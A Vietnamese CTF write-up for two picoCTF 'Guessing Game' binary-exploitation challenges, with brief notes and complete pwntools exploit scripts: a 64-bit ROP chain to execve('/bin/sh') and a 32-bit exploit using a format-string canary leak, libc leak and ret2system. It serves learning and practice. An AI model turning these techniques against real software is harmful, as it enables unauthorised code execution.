# Guessgame 

- [Guessgame1](#guessgame1)
- [Guessgame2](#guessgame2)

## guessgame1

Bài này hay ở chỗ là rand(), luôn cho giá trị giống nhau ở mỗi lần chạy nên là ta có thể dàng tính ra được key bằng cách chạy thử code 

Thêm nữa, bài này nhắc ta nhớ lại cách gọi shell với ROP ở kiến trúc 64-bit

- Cần gadgets để ghi được chuỗi */bin/sh* vào 1 địa chỉ cụ thể
- pop địa chỉ đấy vào rdi, rsi = rdx = 0
- rax = 0x3b
- syscall for 64bit

```python
from pwn import *

binary = context.binary =ELF("./vuln")


if args.REMOTE:
    r = remote("jupiter.challenges.picoctf.org", 26735)
else:
    r = process([binary.path])
    gdb.attach(r, api=True)

payload = b""

'''
0x0000000000400696 : pop rdi ; ret
0x0000000000410ca3 : pop rsi ; ret
0x000000000044cc26 : pop rdx ; ret
0x0000000000436393 : mov qword ptr [rdi], rdx ; ret
0x000000000047ff91 : mov qword ptr [rsi], rax ; ret
0x000000000044cc26 : pop rdx ; ret
0x000000000040137c : syscall
0x0000000000400416 : ret
0x00000000004163f4 : pop rax ; ret
0x0000000000445950 : xor rax, rax ; ret
'''
r.sendline(b"84")
r.recv()

# payload += b"a"*120
# payload += p64(0x0000000000410ca3) #pop rsi
# payload += p64(0x6b7020) #addr
# payload += p64(0x00000000004163f4) #pop rax
# payload += b"/bin/sh\x00"
# payload += p64(0x000000000047ff91) #mov...
# payload += p64(0x000000000044cc26) #pop rdx
# payload += p64(0)
# payload += p64(0x0000000000410ca3) #pop rsi
# payload += p64(0)
# payload += p64(0x00000000004163f4) #pop rax
# payload += p64(0x3b)
# payload += p64(0x0000000000400696) #pop rdi
# payload += p64(0x6b7020) #addr
# payload += p64(0x0000000000400416) #ret
# payload += p64(0x000000000040137c) #syscall

payload += b"a"*120
payload += p64(0x0000000000400696) #pop rdi
payload += p64(0x6b7020) #addr
payload += p64(0x000000000044cc26) #pop rdx
payload += b"/bin/sh\x00"
payload += p64(0x0000000000436393) #mov...
payload += p64(0x000000000044cc26) #pop rdx
payload += p64(0)
payload += p64(0x0000000000410ca3) #pop rsi
payload += p64(0)
payload += p64(0x00000000004163f4) #pop rax
payload += p64(0x3b)
payload += p64(0x0000000000400416) #ret
payload += p64(0x000000000040137c) #syscall

r.sendline(payload)
r.interactive()

```


## guessgame2

Bài này cũng không khó với leak libc, tuy nhiên thì cho ta thêm cái hay là đọc kĩ source code tí để biết là key lúc này được tính base on address of rand funct, chứ không phải rand().

Oke thêm nữa là trên 1 máy thì giá trị addr funct không đổi. Và 1 lý do nữa là k biết sao mà k bf từ -4096 đến 4096 luôn đc mà cứ bị ngắt quãng nhỏ cỡ 300 là dừng, nên phải làm từ từ, may ngay lần 2 đã bf ra được key để bypass vào win.

Từ h thì mỗi thứ so ez, và bài này cũng nhắc mình nhớ 1 vấn đề là call đến puts_plt với tham số puts_got => leak libc

Nó gợi thêm 1 kĩ năng nữa là tìm kiếm libc, thì mình dùng [tool](https://libc.rip/)

yah, we done!!!

```python
from pwn import *

binary = context.binary = ELF("./vuln")
libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
win = 0

if not args.REMOTE:
    r = process(binary.path)
    puts_offset =libc.sym['puts'] #0x73260
    sys_offset = libc.symbols['system']#0x48150
    binsh_offset = next(libc.search(b'/bin/sh\x00'))#0x1bd0f5
    win = -2527
else:
    r = remote('jupiter.challenges.picoctf.org', 57529)
    puts_offset =0x67560
    sys_offset = 0x3cf10
    binsh_offset = 0x17b9db
    win = -3727
    
# gdb.attach(r, api = True)
canary = 0
win_addr = 0x0804876e

#for i in range(-4096, 4096):
for i in range(-3727,4096):
    r.sendlineafter(b"guess?\n" , str(i))
    response = r.recvline()
    # log.info(f"{i}: {response}")
    if b"win" in response:
        log.info(f"Win key: {i}")
        win = i 
        break

    
r.sendline(b"%135$p")
r.recv()
canary = int(r.recv().split(b": ")[1].split(b"\n")[0],16)
log.info(f"Canary: {hex(canary)}" )
puts_plt = binary.plt['puts']
puts_got = binary.got['puts'] 
printf_got = binary.got['printf'] 
gets_got = binary.got['gets'] 



payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(puts_plt) + p32(win_addr) + p32(puts_got)

r.sendline(str(i))
r.sendline(payload)
r.recvuntil(b"a\n\n")
puts_addr = r.recv(4)
log.info(f"Puts leak addr: {hex(u32(puts_addr))}")


payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(puts_plt) + p32(win_addr) + p32(printf_got)
r.sendline(payload)
r.recvuntil(b"a\n\n")
printf_got = r.recv(4)
log.info(f"Printf leak addr: {hex(u32(printf_got))}")


payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(puts_plt) + p32(win_addr) + p32(gets_got)
r.sendline(payload)
r.recvuntil(b"a\n\n")
gets_got = r.recv(4)
log.info(f"gets leak addr: {hex(u32(gets_got))}")


libc_addr = u32(puts_addr) - puts_offset
sys_addr = libc_addr + sys_offset
binsh_addr = libc_addr + binsh_offset

log.info(f"Libc addr: {hex(libc_addr)}")
payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(sys_addr) + p32(win_addr) + p32(binsh_addr)
r.sendline(payload)


r.interactive()


```